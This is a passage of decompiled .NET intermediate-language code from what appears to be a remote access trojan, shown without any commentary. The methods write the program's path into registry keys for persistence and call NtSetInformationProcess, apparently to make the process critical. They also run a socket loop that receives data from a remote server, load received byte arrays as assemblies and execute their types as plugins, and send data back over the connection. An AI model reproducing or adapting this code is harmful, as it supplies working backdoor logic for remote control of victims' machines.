        IL_02cc:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02d1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02d6:  ldstr      "\" .."
        IL_02db:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02e0:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02e5:  leave.s    IL_0302

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02e7:  dup
        IL_02e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02ed:  stloc.s    V_8
        IL_02ef:  ldloc.s    V_8
        IL_02f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0300:  leave.s    IL_0302

      }  // end handler
      IL_0302:  nop
      .try
      {
        IL_0303:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0308:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_030d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0312:  ldsfld     string j.OK::sf
        IL_0317:  ldstr      "\\"
        IL_031c:  ldsfld     string j.OK::RG
        IL_0321:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0326:  ldstr      ""
        IL_032b:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0330:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0335:  ldstr      "\""
        IL_033a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_033f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0344:  ldstr      "\" .."
        IL_0349:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_034e:  ldc.i4.0
        IL_034f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0354:  brfalse.s  IL_0393

        IL_0356:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_035b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0360:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0365:  ldsfld     string j.OK::sf
        IL_036a:  ldc.i4.1
        IL_036b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0370:  ldsfld     string j.OK::RG
        IL_0375:  ldstr      "\""
        IL_037a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_037f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0384:  ldstr      "\" .."
        IL_0389:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_038e:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0393:  leave.s    IL_03b0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0395:  dup
        IL_0396:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_039b:  stloc.s    V_9
        IL_039d:  ldloc.s    V_9
        IL_039f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03ae:  leave.s    IL_03b0

      }  // end handler
      IL_03b0:  leave      IL_01c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03b5:  dup
      IL_03b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03bb:  stloc.s    V_10
      IL_03bd:  ldloc.s    V_10
      IL_03bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03ce:  leave      IL_01c4
    }  // end handler
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             uint8[] V_2,
             int32 V_3)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  call       instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.0
    IL_0013:  ldarg.0
    IL_0014:  stloc.2
    IL_0015:  ldc.i4.0
    IL_0016:  stloc.3
    IL_0017:  br.s       IL_0034

    IL_0019:  ldloc.2
    IL_001a:  ldloc.3
    IL_001b:  ldelem.u1
    IL_001c:  stloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldloca.s   V_1
    IL_0020:  ldstr      "x2"
    IL_0025:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stloc.0
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  add.ovf
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  ldloc.2
    IL_0036:  ldlen
    IL_0037:  conv.i4
    IL_0038:  blt.s      IL_0019

    IL_003a:  ldloc.0
    IL_003b:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       114 (0x72)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Reflection.Module V_1,
             class [mscorlib]System.Reflection.Module[] V_2,
             int32 V_3,
             class [mscorlib]System.Type V_4,
             class [mscorlib]System.Type[] V_5,
             int32 V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.2
    IL_000c:  ldc.i4.0
    IL_000d:  stloc.3
    IL_000e:  br.s       IL_0068

    IL_0010:  ldloc.2
    IL_0011:  ldloc.3
    IL_0012:  ldelem.ref
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001a:  stloc.s    V_5
    IL_001c:  ldc.i4.0
    IL_001d:  stloc.s    V_6
    IL_001f:  br.s       IL_005c

    IL_0021:  ldloc.s    V_5
    IL_0023:  ldloc.s    V_6
    IL_0025:  ldelem.ref
    IL_0026:  stloc.s    V_4
    IL_0028:  ldloc.s    V_4
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0056

    IL_0041:  ldloc.1
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.s    V_4
    IL_0049:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004e:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0053:  stloc.0
    IL_0054:  br.s       IL_0070

    IL_0056:  ldloc.s    V_6
    IL_0058:  ldc.i4.1
    IL_0059:  add.ovf
    IL_005a:  stloc.s    V_6
    IL_005c:  ldloc.s    V_6
    IL_005e:  ldloc.s    V_5
    IL_0060:  ldlen
    IL_0061:  conv.i4
    IL_0062:  blt.s      IL_0021

    IL_0064:  ldloc.3
    IL_0065:  ldc.i4.1
    IL_0066:  add.ovf
    IL_0067:  stloc.3
    IL_0068:  ldloc.3
    IL_0069:  ldloc.2
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0010

    IL_006e:  ldnull
    IL_006f:  stloc.0
    IL_0070:  ldloc.0
    IL_0071:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  ldloc.0
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       565 (0x235)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int64 V_2,
             int32 V_3,
             string V_4,
             int32 V_5,
             char V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brfalse    IL_01d2

    IL_0014:  ldc.i4.m1
    IL_0015:  conv.i8
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.1
    .try
    {
      IL_0019:  ldloc.1
      IL_001a:  ldc.i4.1
      IL_001b:  add.ovf
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  ldc.i4.s   10
      IL_0020:  bne.un.s   IL_002a

      IL_0022:  ldc.i4.0
      IL_0023:  stloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002a:  ldsfld     bool j.OK::Cn
      IL_002f:  brtrue.s   IL_0036

      IL_0031:  leave      IL_01d2

      IL_0036:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0040:  ldc.i4.1
      IL_0041:  bge.s      IL_0055

      IL_0043:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0048:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004d:  ldc.i4.m1
      IL_004e:  ldc.i4.0
      IL_004f:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0054:  pop
      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_01b5

      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.m1
      IL_0067:  conv.i8
      IL_0068:  bne.un.s   IL_00e9

      IL_006a:  ldstr      ""
      IL_006f:  stloc.s    V_4
      IL_0071:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0076:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007b:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0080:  stloc.s    V_5
      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.m1
      IL_0085:  beq.s      IL_008d

      IL_0087:  ldloc.s    V_5
      IL_0089:  brfalse.s  IL_0092

      IL_008b:  br.s       IL_00c4

      IL_008d:  leave      IL_01d2

      IL_0092:  ldloc.s    V_4
      IL_0094:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0099:  stloc.0
      IL_009a:  ldstr      ""
      IL_009f:  stloc.s    V_4
      IL_00a1:  ldloc.0
      IL_00a2:  brtrue.s   IL_00b2

      IL_00a4:  ldstr      ""
      IL_00a9:  call       bool j.OK::Send(string)
      IL_00ae:  pop
      IL_00af:  ldc.i4.m1
      IL_00b0:  conv.i8
      IL_00b1:  stloc.0
      IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b7:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bc:  ldc.i4.0
      IL_00bd:  bgt.s      IL_0055

      IL_00bf:  br         IL_0019

      IL_00c4:  ldloc.s    V_4
      IL_00c6:  ldloc.s    V_5
      IL_00c8:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00cd:  stloc.s    V_6
      IL_00cf:  ldloca.s   V_6
      IL_00d1:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00db:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  stloc.s    V_4
      IL_00e7:  br.s       IL_0071

      IL_00e9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ee:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00f3:  ldc.i4.1
      IL_00f4:  add.ovf
      IL_00f5:  ldc.i4.1
      IL_00f6:  sub.ovf
      IL_00f7:  ldc.i4.1
      IL_00f8:  add.ovf
      IL_00f9:  newarr     [mscorlib]System.Byte
      IL_00fe:  stsfld     uint8[] j.OK::b
      IL_0103:  ldloc.0
      IL_0104:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0109:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_010e:  sub.ovf
      IL_010f:  stloc.2
      IL_0110:  ldsfld     uint8[] j.OK::b
      IL_0115:  ldlen
      IL_0116:  conv.i4
      IL_0117:  conv.i8
      IL_0118:  ldloc.2
      IL_0119:  ble.s      IL_0130

      IL_011b:  ldloc.2
      IL_011c:  ldc.i4.1
      IL_011d:  conv.i8
      IL_011e:  sub.ovf
      IL_011f:  conv.ovf.i4
      IL_0120:  ldc.i4.1
      IL_0121:  add.ovf
      IL_0122:  ldc.i4.1
      IL_0123:  sub.ovf
      IL_0124:  ldc.i4.1
      IL_0125:  add.ovf
      IL_0126:  newarr     [mscorlib]System.Byte
      IL_012b:  stsfld     uint8[] j.OK::b
      IL_0130:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0135:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_013a:  ldsfld     uint8[] j.OK::b
      IL_013f:  ldc.i4.0
      IL_0140:  ldsfld     uint8[] j.OK::b
      IL_0145:  ldlen
      IL_0146:  conv.i4
      IL_0147:  ldc.i4.0
      IL_0148:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_014d:  stloc.3
      IL_014e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0153:  ldsfld     uint8[] j.OK::b
      IL_0158:  ldc.i4.0
      IL_0159:  ldloc.3
      IL_015a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_015f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0164:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0169:  ldloc.0
      IL_016a:  bne.un     IL_0019

      IL_016f:  ldc.i4.m1
      IL_0170:  conv.i8
      IL_0171:  stloc.0
      IL_0172:  ldnull
      IL_0173:  ldftn      void j.OK::_Lambda__1(object)
      IL_0179:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_017e:  ldc.i4.1
      IL_017f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0184:  dup
      IL_0185:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_018a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_018f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0194:  ldc.i4.s   100
      IL_0196:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_019b:  pop
      IL_019c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01a1:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01a6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01ab:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01b0:  br         IL_0019

      IL_01b5:  leave.s    IL_01d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b7:  dup
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  stloc.s    V_7
      IL_01bf:  ldloc.s    V_7
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d0:  leave.s    IL_01d2

    }  // end handler
    IL_01d2:  nop
    .try
    {
      IL_01d3:  ldsfld     object j.OK::PLG
      IL_01d8:  brfalse.s  IL_0200

      IL_01da:  ldsfld     object j.OK::PLG
      IL_01df:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01e4:  ldnull
      IL_01e5:  ldstr      "clear"
      IL_01ea:  ldc.i4.0
      IL_01eb:  newarr     [mscorlib]System.Object
      IL_01f0:  ldnull
      IL_01f1:  ldnull
      IL_01f2:  ldnull
      IL_01f3:  ldc.i4.1
      IL_01f4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01f9:  pop
      IL_01fa:  ldnull
      IL_01fb:  stsfld     object j.OK::PLG
      IL_0200:  leave.s    IL_021d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0202:  dup
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0208:  stloc.s    V_8
      IL_020a:  ldloc.s    V_8
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  leave.s    IL_021d

    }  // end handler
    IL_021d:  ldc.i4.0
    IL_021e:  stsfld     bool j.OK::Cn
    IL_0223:  call       bool j.OK::connect()
    IL_0228:  brfalse.s  IL_01d2

    IL_022a:  ldc.i4.1
    IL_022b:  stsfld     bool j.OK::Cn
    IL_0230:  br         IL_0000
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       bool j.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       232 (0xe8)
    .maxstack  5
    .locals init (bool V_0,
             object V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             int32 V_3,
             uint8[] V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_000e

    IL_0007:  ldc.i4.0
    IL_0008:  stloc.0
    IL_0009:  br         IL_00e6

    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0014:  stloc.1
      IL_0015:  ldloc.1
      IL_0016:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001b:  ldsfld     bool j.OK::Cn
        IL_0020:  brtrue.s   IL_0029

        IL_0022:  ldc.i4.0
        IL_0023:  stloc.0
        IL_0024:  leave      IL_00e6

        IL_0029:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002e:  stloc.2
        IL_002f:  ldarg.0
        IL_0030:  ldlen
        IL_0031:  conv.i4
        IL_0032:  stloc.3
        IL_0033:  ldloca.s   V_3
        IL_0035:  call       instance string [mscorlib]System.Int32::ToString()
        IL_003a:  ldstr      bytearray (00 00 ) 
        IL_003f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0044:  stloc.s    V_5
        IL_0046:  ldloca.s   V_5
        IL_0048:  call       uint8[] j.OK::SB(string&)
        IL_004d:  stloc.s    V_4
        IL_004f:  ldloc.2
        IL_0050:  ldloc.s    V_4
        IL_0052:  ldc.i4.0
        IL_0053:  ldloc.s    V_4
        IL_0055:  ldlen
        IL_0056:  conv.i4
        IL_0057:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005c:  ldloc.2
        IL_005d:  ldarg.0
        IL_005e:  ldc.i4.0
        IL_005f:  ldarg.0
        IL_0060:  ldlen
        IL_0061:  conv.i4
        IL_0062:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0067:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_006c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0071:  ldloc.2
        IL_0072:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0077:  ldc.i4.0
        IL_0078:  ldloc.2
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_008f

      }  // end .try
      finally
      {
        IL_0088:  ldloc.1
        IL_0089:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008e:  endfinally
      }  // end handler
      IL_008f:  leave.s    IL_00e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.s    V_6
      IL_0099:  ldloc.s    V_6
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      .try
      {
        IL_00a0:  ldsfld     bool j.OK::Cn
        IL_00a5:  brfalse.s  IL_00b7

        IL_00a7:  ldc.i4.0
        IL_00a8:  stsfld     bool j.OK::Cn
        IL_00ad:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b2:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b7:  leave.s    IL_00d4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b9:  dup
        IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00bf:  stloc.s    V_7
        IL_00c1:  ldloc.s    V_7
        IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d2:  leave.s    IL_00d4

      }  // end handler
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00de:  leave.s    IL_00e0

    }  // end handler
    IL_00e0:  ldsfld     bool j.OK::Cn
    IL_00e5:  stloc.0
    IL_00e6:  ldloc.0
    IL_00e7:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       86 (0x56)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  ldarg.2
      IL_0030:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
